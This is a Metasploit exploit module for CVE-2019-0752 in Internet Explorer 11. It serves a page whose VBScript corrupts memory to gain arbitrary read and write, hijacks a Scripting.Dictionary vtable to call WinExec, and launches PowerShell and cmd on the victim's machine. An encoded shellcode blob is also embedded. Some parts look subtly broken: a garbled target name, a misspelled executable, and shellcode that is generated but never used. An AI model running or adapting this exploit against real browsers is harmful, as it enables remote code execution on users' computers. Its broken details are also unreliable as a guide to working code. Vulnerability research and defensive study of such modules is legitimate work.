##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
    Rank = NormalRanking
  
    include Msf::Exploit::Remote::HttpServer
    include Msf::Exploit::EXE
    include Msf::Exploit::RopDb
    include Msf::Exploit::Remote::BrowserAutopwn

    def initialize(info = {})
        super(
          update_info(
            info,
            'Name'           => "Microsoft Internet Explorer Windows 10 1809 17763.316 - Scripting Engine Memory Corruption",
            'Description'    => %q{
              Microsoft Internet Explorer Windows 10 1809 17763.316 - Scripting Engine Memory Corruption
              It was tested on Internet Explorer 11 11.379.17763.0 on Windows 10 Windows 10 1809 17763.379
            },
            'License'        => MSF_LICENSE,
            'Author'         => [
                'SIMON ZUCKERBRAUN',       # Original RE research and exploitation
                'Youngjoon Kim <acorn421[at]gmail.com>'            # Metasploit module
              ],
            'Platform'       => 'win',
            'Targets'        =>
              [
                # [ 'Automatic', {} ],
                [ 'Internet Explorer 11 1809 17763.3161809 17763.3161809 17763.316 on Windows 10 1809 17763.379', { } ],
              ],
            'References'     =>
              [
                [ 'CVE', '2019-0752' ],         # Unknown
                [ 'EBD', '46928' ]              # Exploit Database (https://www.exploit-db.com/exploits/46654)
              ],
            'Arch'           => ARCH_X86,
            'DisclosureDate' => "April 09 2019",
            'DefaultTarget'  => 0
          )
        )
    end

    # Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3080.0 Safari/537.36
    def get_target(agent)
      return target if target.name != 'Automatic'
  
      nt = agent.scan(/Windows NT (\d+.\d*)/).flatten[0] || ''
      cm = agent.scan(/rv:(\d*.\d+)/).flatten[0] || ""
  
      cm_name = "IE #{cm}"

      case nt
      when '5.1'
        os_name = 'Windows XP SP3'
      when '6.0'
        os_name = 'Windows Vista'
      when '6.1'
        os_name = 'Windows 7'
      when '6.2'
        os_name = 'Windows 8'
      when '6.3'
        os_name = 'Windows 8.1'
      when '10.0'
        os_name = 'Windows 10'
      end
  
      targets.each do |t|
        # if (!cm.empty? && t.name.include?(cm_name)) && (!nt.empty? && t.name.include?(os_name))
        if ((!cm.empty? && t.name.include?(cm_name)) && (!nt.empty? && t.name.include?(os_name)))
        return t
        end
      end
  
      nil
    end
    
    def get_payload(t)
      # stack_pivot = "\x41\x42\x43\x44"
      # code        = payload.encoded
  
      # case t['Rop']
      # when :msvcrt
      #   print_status("Using msvcrt ROP")
      #   rop_payload = generate_rop_payload('msvcrt', code, 'pivot' => stack_pivot, 'target' => 'xp')
  
      # else
      #   print_status("Using JRE ROP")
      #   rop_payload = generate_rop_payload('java', code, 'pivot' => stack_pivot)
      # end
  
      # rop_payload
      rop_payload = "%u48fc%ue483%ue8f0%u00c0%u0000%u5141%u5041%u5152%u4856%ud231%u4865%u528b%u4860%u528b%u4818%u528b%u4820%u728b%u4850%ub70f%u4a4a%u314d%u48c9%uc031%u3cac%u7c61%u2c02%u4120%uc9c1%u410d%uc101%uede2%u4152%u4851%u528b%u8b20%u3c42%u0148%u8bd0%u8880%u0000%u4800%uc085%u6774%u0148%u50d0%u488b%u4418%u408b%u4920%ud001%u56e3%uff48%u41c9%u348b%u4888%ud601%u314d%u48c9%uc031%u41ac%uc9c1%u410d%uc101%ue038%uf175%u034c%u244c%u4508%ud139%ud875%u4458%u408b%u4924%ud001%u4166%u0c8b%u4448%u408b%u491c%ud001%u8b41%u8804%u0148%u41d0%u4158%u5e58%u5a59%u5841%u5941%u5a41%u8348%u20ec%u5241%ue0ff%u4158%u5a59%u8b48%ue912%uff57%uffff%u485d%u01ba%u0000%u0000%u0000%u4800%u8d8d%u0101%u0000%uba41%u8b31%u876f%ud5ff%uf0bb%ua2b5%u4156%ua6ba%ubd95%uff9d%u48d5%uc483%u3c28%u7c06%u800a%ue0fb%u0575%u47bb%u7213%u6a6f%u5900%u8941%uffda%u63d5%u6c61%u2e63%u7865%u0065"
      
      rop_payload
    end

    def get_html(t)
      js_p = get_payload(t)

      html = <<-HTML
      <html>
      <meta http-equiv="x-ua-compatible" content="IE=8">
      <meta http-equiv="Expires" content="-1">
      <body>
        <div id="container1" style="overflow:scroll; width: 10px">
          <div id="content1" style="width:5000000px">
            Content
          </div>
        </div>
      <script language="VBScript.Encode">
      Dim ar1(&h3000000)
      Dim ar2(1000)
      Dim gremlin
      addressOfGremlin = &h28281000
      Class MyClass
        Private mValue
        Public Property Let Value(v)
          mValue = v
        End Property
        Public Default Property Get P
          P = mValue        ' Where to write
        End Property
      End Class
      Sub TriggerWrite(where, val)
        Dim v1
        Set v1 = document.getElementById("container1")
        v1.scrollLeft = val    ' Write this value (Maximum: 0x001767dd)
        Dim c
        Set c = new MyClass
        c.Value = where
        Set v1.scrollLeft = c
      End Sub
      ' Our vulnerability does not immediately give us an unrestricted
      ' write (though we could manufacture one). For our purposes, the
      ' following is sufficient. It writes an arbitrary DWORD to an
      ' arbitrary location, and sets the subsequent 3 bytes to zero.
      Sub WriteInt32With3ByteZeroTrailer(addr, val)
        TriggerWrite addr    , (val) AND &hff
        TriggerWrite addr + 1, (val\&h100) AND &hff
        TriggerWrite addr + 2, (val\&h10000) AND &hff
        TriggerWrite addr + 3, (val\&h1000000) AND &hff
      End Sub
      Sub WriteAsciiStringWith4ByteZeroTrailer(addr, str)
        For i = 0 To Len(str) - 1
          TriggerWrite addr + i, Asc(Mid(str, i + 1, 1))
        Next
      End Sub
      Function ReadInt32(addr)
        WriteInt32With3ByteZeroTrailer addressOfGremlin + &h8, addr
        ReadInt32 = ar1(gremlin)
      End Function
      Function LeakAddressOfObject(obj)
        Set ar1(gremlin + 1) = obj
        LeakAddressOfObject = ReadInt32(addressOfGremlin + &h18)
      End Function
      Sub Exploit()
        ' Corrupt vt of one array element (the "gremlin")
        TriggerWrite addressOfGremlin, &h4003  ' VT_BYREF | VT_I4
        For i = ((addressOfGremlin - &h20) / &h10) Mod &h100 To UBound(ar1) Step &h100
          If Not IsEmpty(ar1(i)) Then
            gremlin = i
            Exit For
          End If
        Next
        
        If IsEmpty(gremlin) Then
          MsgBox "Could not find gremlin"
          Exit Sub
        End If
        
        For i = 0 To UBound(ar2)
          Set ar2(i) = CreateObject("Scripting.Dictionary")
        Next
        
        Set dict = ar2(UBound(ar2) / 2)
        addressOfDict = LeakAddressOfObject(dict)
        vtableOfDict = ReadInt32(addressOfDict)
        scrrun = vtableOfDict - &h11fc
        kernel32 = ReadInt32(scrrun + &h1f1a4) - &h23c90
        winExec = kernel32 + &h5d380
        
        dict.Exists "dummy"    ' Make a dispatch call, just to populate pld
        ' Relocate pld to ensure its address doesn't contain a null byte
        pld = ReadInt32(addressOfDict + &h3c)
        fakePld = &h28281020
        For i = 0 To 3 - 1
          WriteInt32With3ByteZeroTrailer fakePld + 4 * i, ReadInt32(pld + 4 * i)
        Next
        
        fakeVtable = &h28282828    ' ASCII "(((("
        For i = 0 To 21
          If i = 12 Then    ' Dictionary.Exists
            fptr = winExec
          Else
            fptr = ReadInt32(vtableOfDict + 4 * i)
          End If
          WriteInt32With3ByteZeroTrailer (fakeVtable + 4 * i), fptr
        Next
        
        WriteAsciiStringWith4ByteZeroTrailer addressOfDict, "((((\..\PowerShell.ewe -Command ""<#AAAAAAAAAAAAAAAAAAAAAAAAA"
        WriteInt32With3ByteZeroTrailer addressOfDict + &h3c, fakePld
        WriteAsciiStringWith4ByteZeroTrailer addressOfDict + &h40, "#>$a = """"Start-Process cmd `""""""/t:4f /k whoami /user`"""""""""""" ; Invoke-Command -ScriptBlock ([Scriptblock]::Create($a))"""
        
        On Error Resume Next
        dict.Exists "dummy"    ' Wheeee!!
        
        ' A little cleanup to help prevent crashes after the exploit
        For i = 1 To 3
          WriteInt32With3ByteZeroTrailer addressOfDict + &h48 * i, vtableOfDict
          WriteInt32With3ByteZeroTrailer addressOfDict + (&h48 * i) + &h14, 2
        Next
        Erase Dict
        Erase ar2
      End Sub
      Exploit
      </script>
      </body>
      </html>
      HTML

      html.gsub(/^\t\t/, '')
    end

    def on_request_uri(cli, request)
        agent = request.headers['User-Agent']
        print_status("Requesting: #{request.uri}")

        target = get_target(agent)
        if target.nil?
          print_error("Browser not supported, sending 404: #{agent}")
          send_not_found(cli)
        return
        end

        print_status("Target selected as: #{target.name}")
        html = get_html(target)
        send_response(cli, html, 'Content-Type' => 'text/html', 'Cache-Control' => 'no-cache')
    end

end
